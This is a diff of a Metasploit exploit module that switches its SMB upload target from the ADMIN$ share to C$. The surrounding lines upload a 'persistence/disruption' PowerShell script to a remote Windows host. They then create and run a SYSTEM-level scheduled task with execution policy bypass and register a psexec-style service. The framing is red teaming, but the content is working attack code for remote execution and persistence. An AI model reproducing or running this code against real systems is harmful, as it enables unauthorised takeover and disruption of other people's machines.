@@ -152,7 +152,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
       # === CORRECT UPLOAD BLOCK FOR METASPLOIT 6.4+ (RubySMB) ===
       print_status("Uploading persistence/disruption script to ADMIN$ share...")
-      share = "\\\\#{rhost}\\ADMIN$"
+      share = "\\\\#{rhost}\\C$"
       simple.connect(share)
       tree = simple.client.tree_connect(share)
 
@@ -163,7 +163,7 @@ class MetasploitModule < Msf::Exploit::Remote
       file.write(data: persistence_script)
       file.close
 
-      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\ADMIN$\\#{file_path}")
+      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\C$\\#{file_path}")
 
       # Execute the script immediately via scheduled task
       exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
@@ -172,7 +172,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
       # Use Psexec mixin for reliable execution
       self.simple = true
-      self.smb_share = 'ADMIN$'
+      self.smb_share = 'C$'
       self.service_name = 'RedTeamSvcTemp'
       self.service_display_name = 'RedTeam Temporary Execution'
 
